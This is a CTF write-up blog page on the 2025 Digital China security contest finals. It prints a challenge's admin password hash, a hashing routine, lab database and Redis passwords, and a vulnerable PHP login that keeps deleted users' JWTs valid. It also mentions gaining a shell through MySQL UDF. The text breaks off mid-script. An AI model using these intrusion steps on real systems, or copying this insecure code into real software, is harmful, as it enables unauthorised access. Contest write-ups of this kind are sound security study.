
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>2025数字中国数字安全赛道 决赛 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0"><span class="toc-number">2.</span> <span class="toc-text">资产安全评估</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-number">2.2.</span> <span class="toc-text">2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%88%A0%E9%99%A4%E4%B8%8E%E6%81%A2%E5%A4%8D"><span class="toc-number">3.</span> <span class="toc-text">数据删除与恢复</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1"><span class="toc-number">3.1.</span> <span class="toc-text">1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%A1%E5%9E%8B%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8"><span class="toc-number">4.</span> <span class="toc-text">模型环境安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2"><span class="toc-number">4.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1"><span class="toc-number">4.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3"><span class="toc-number">4.3.</span> <span class="toc-text">3</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>2025数字中国数字安全赛道 决赛</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/4/24
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                线下赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">1.8k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">8分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最摆的一集</p>
<span id="more"></span>

<hr>
<h1 id="资产安全评估"><a href="#资产安全评估" class="headerlink" title="资产安全评估"></a>资产安全评估</h1><p><a target="_blank" rel="noopener" href="http://192.168.67.155:8080/">http://192.168.67.155:8080</a></p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><blockquote>
<p>公司新上线了一款商家侧电商信息发布平台，在进行安全测试时，管理员通过安全评估手段，发现可能存在安全漏洞问题。请选手下载平台提供的附件，对附件中的<a target="_blank" rel="noopener" href="http://www.zip源码进行分析,并尝试获取后台权限,将后台中的flag提交./">www.zip源码进行分析，并尝试获取后台权限，将后台中的flag提交。</a></p>
</blockquote>
<p>20191204-124036-1.sql</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>ob_member<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'09d5dde58d419119571be42244e84a39'</span><span class="token punctuation">,</span> <span class="token string">'3162875@qq.com'</span><span class="token punctuation">,</span> <span class="token string">'0rrt5r2eg00tdut5fd18fk8sa5'</span><span class="token punctuation">,</span> <span class="token string">'18555550710'</span><span class="token punctuation">,</span> <span class="token string">'1575434387'</span><span class="token punctuation">,</span> <span class="token string">'1575434378'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到加密的密码 09d5dde58d419119571be42244e84a39</p>
<p>看一下加密的方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">data_md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'OneBase'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    
    <span class="token keyword">return</span> <span class="token string single-quoted-string">''</span> <span class="token operator">===</span> <span class="token variable">$str</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>emm，这也爆不出来啊</p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><blockquote>
<p>管理员在进一步安全测试时发现电商信息发布平台，可能存在安全漏洞问题。请选手下载平台提供的附件，对附件中的<a target="_blank" rel="noopener" href="http://www.zip源码进行分析,并尝试获取站点权限,获取服务器中的flag并进行提交./">www.zip源码进行分析，并尝试获取站点权限，获取服务器中的flag并进行提交。</a></p>
</blockquote>
<hr>
<h1 id="数据删除与恢复"><a href="#数据删除与恢复" class="headerlink" title="数据删除与恢复"></a>数据删除与恢复</h1><p><a target="_blank" rel="noopener" href="http://192.168.67.155:8080/">http://192.168.67.155:8080</a></p>
<h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><blockquote>
<p>管理员利用AI模型设计了一个结合redis和mysql的交易数据查询系统，但是未对代码的安全性进行充分验证，导致mysql中的用户虽然被删除但仍可以利用redis中的JWT信息，登录交易数据查询系统。请选手下载平台提供的附件(用户表.xlsx)，根据用户表（其中1个用户为管理员测试账号，可进行数据库管理）及数据库中存在的用户,判断哪些用户在被删除后仍可以利用JWT进行登录，将用户名按照用户表中的先后排序，并使用“_”拼接后，通过md5处理后进行提交。</p>
</blockquote>
<p>舍 近 求 远</p>
<p>由于某人 md5 时多了一个换行导致我专门进后台验证（</p>
<p>给的 xlsx 一个个测，测出来 zhangzehua 能正常登录且是管理员账户</p>
<p>数据库账密也是 <code>zhangzehua:zhangzehua@cimer..</code></p>
<p>进入数据库后 udf 写 shell</p>
<p>读到 index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 开启输出缓冲</span>
<span class="token keyword">require_once</span> <span class="token string single-quoted-string">'vendor/autoload.php'</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">Firebase<span class="token punctuation">\</span>JWT<span class="token punctuation">\</span>JWT</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Firebase<span class="token punctuation">\</span>JWT<span class="token punctuation">\</span>Key</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token constant">JWT_KEY</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'12345678901234567898765456789098'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">JWT_ALGO</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'HS256'</span><span class="token punctuation">;</span>

<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DB_HOST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DB_PASS'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'roottoor@cimer2025'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DB_NAME'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'new'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$redis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Redis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token constant">DB_HOST</span><span class="token punctuation">,</span> <span class="token constant">DB_USER</span><span class="token punctuation">,</span> <span class="token constant">DB_PASS</span><span class="token punctuation">,</span> <span class="token constant">DB_NAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 连接Redis</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$redis</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">6379</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Redis连接失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$redis</span><span class="token operator">-></span><span class="token function">auth</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'root@root!cimer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        
        <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'sub'</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">,</span>
	    <span class="token string single-quoted-string">'pwd'</span> <span class="token operator">=></span> <span class="token variable">$password</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'iat'</span> <span class="token operator">=></span> <span class="token number">1743299964</span><span class="token punctuation">,</span>  
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$jwt</span> <span class="token operator">=</span> <span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token constant">JWT_KEY</span><span class="token punctuation">,</span> <span class="token constant">JWT_ALGO</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$redis</span><span class="token operator">-></span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jwt:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$jwt</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            
            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">,</span> <span class="token variable">$jwt</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">7200</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// httponly=true</span>
            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: welcome.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// 数据库验证</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT password FROM users WHERE username = ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$storedEncryptedPassword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$storedEncryptedPassword</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$redis</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jwt:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$jwt</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'valid'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">,</span> <span class="token variable">$jwt</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">7200</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: welcome.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'账号或密码错误'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'系统错误：'</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$redis</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 结束输出缓冲</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>交易数据查询系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
        <span class="token selector">.login-box</span> <span class="token punctuation">&#123;</span> <span class="token property">width</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> 100px auto<span class="token punctuation">;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span> <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #ccc<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
        <span class="token selector">.form-group</span> <span class="token punctuation">&#123;</span> <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
        <span class="token selector">input</span> <span class="token punctuation">&#123;</span> <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span> <span class="token property">margin-top</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
        <span class="token selector">button</span> <span class="token punctuation">&#123;</span> <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span> <span class="token property">background</span><span class="token punctuation">:</span> #007bff<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span> <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>des.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">function</span> <span class="token function">encryptPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">const</span> username <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'input[name="username"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
            <span class="token keyword">const</span> password <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'input[name="password"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"用户名和密码不能为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            
            <span class="token keyword">const</span> secretKey1 <span class="token operator">=</span> <span class="token string">"ThisIsAComplexKey123!"</span><span class="token punctuation">;</span>
            <span class="token keyword">const</span> secretKey2 <span class="token operator">=</span> <span class="token string">"AnotherSecretKey456_"</span><span class="token punctuation">;</span>
            <span class="token keyword">const</span> secretKey3 <span class="token operator">=</span> <span class="token string">"AndYetAnotherKey!@#"</span><span class="token punctuation">;</span>

            
            <span class="token keyword">const</span> encryptedPassword <span class="token operator">=</span> <span class="token function">strEnc</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> secretKey1<span class="token punctuation">,</span> secretKey2<span class="token punctuation">,</span> secretKey3<span class="token punctuation">)</span><span class="token punctuation">;</span>
            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'input[name="password"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> encryptedPassword<span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

